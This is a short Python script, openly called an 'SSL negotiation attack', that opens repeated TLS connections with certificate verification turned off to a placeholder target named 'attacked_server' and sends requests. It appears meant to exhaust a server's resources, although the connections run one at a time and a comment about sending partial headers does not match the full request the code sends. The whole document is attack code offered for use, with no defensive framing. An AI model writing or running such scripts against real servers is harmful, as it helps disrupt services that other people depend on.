import socket
import ssl
import time

target_host = 'attacked_server'
target_port = 3000

# SSL context creation with no certificate verification
context = ssl.create_default_context()
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

num_connections = 100
interval = 5  # Time in seconds to wait before sending more data

print("Starting SSL negotiation attack...")

for i in range(1, num_connections + 1):
    try:
        sock = socket.create_connection((target_host, target_port))
        ssl_sock = context.wrap_socket(sock, server_hostname=target_host)
        ssl_sock.do_handshake()
        
        print(f"Connection {i} initiated")
        
        # Send partial headers or other data to keep the connection active
        ssl_sock.sendall(b"GET / HTTP/1.1\r\nHost: attacked_server\r\n\r\n")
        
        # Monitor server response if needed
        response = ssl_sock.recv(4096)
        print(f"Received response on connection {i}: {response.decode('utf-8')}")
        
        time.sleep(interval)

    except Exception as e:
        print(f"Error initiating connection {i}: {e}")
